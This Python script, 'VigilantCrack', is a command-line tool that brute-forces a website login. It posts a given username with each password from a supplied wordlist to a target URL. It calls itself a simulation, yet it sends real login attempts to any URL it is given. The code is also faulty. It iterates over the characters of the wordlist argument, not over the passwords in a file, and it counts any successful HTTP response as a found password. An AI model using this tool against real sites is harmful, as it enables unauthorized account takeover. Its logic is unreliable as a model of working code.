import argparse
import banner
import requests

# Prinitng the banner
banner.banner()

# Initialize the parser
parser = argparse.ArgumentParser(description="Welcome to VigilantCrack!")

# Adding Arguments to the parser
parser.add_argument('--url', help="URL to bruteforce the website!", type=str)
parser.add_argument('--username', help="Username to bruteforce the website!", type=str)
parser.add_argument('--wordlist', help="Wordlist of passwords to bruteforce the website!", type=str)

args = parser.parse_args()


def simulate_brute_force(target_url: str, target_username: str, password_list: list) -> bool:
    """Function to simulate a brute force operation against the specified URL"""
    
    for password in password_list:
        payload = {
            'username': str(target_username),
            'password': str(password)
        }

        try:
            response = requests.post(target_url, data=payload)

            if response.ok:
                print(
                    f"Password found! Username: {target_username}, Password: {password}")
                return True
            print(f"Attempt failed for password: {password}")
        except requests.ConnectionError:
            print("Connection error!")
            return False
        except requests.Timeout:
            print("Session timeout!")
            return False


    print("Brute Force Attack simulation completed. Password not found.")
    return False

if (args.url == None or args.username == None or args.wordlist == None):
    print("Please specify the required arguments!")
    
else:
    simulate_brute_force(args.url, args.username, args.wordlist)



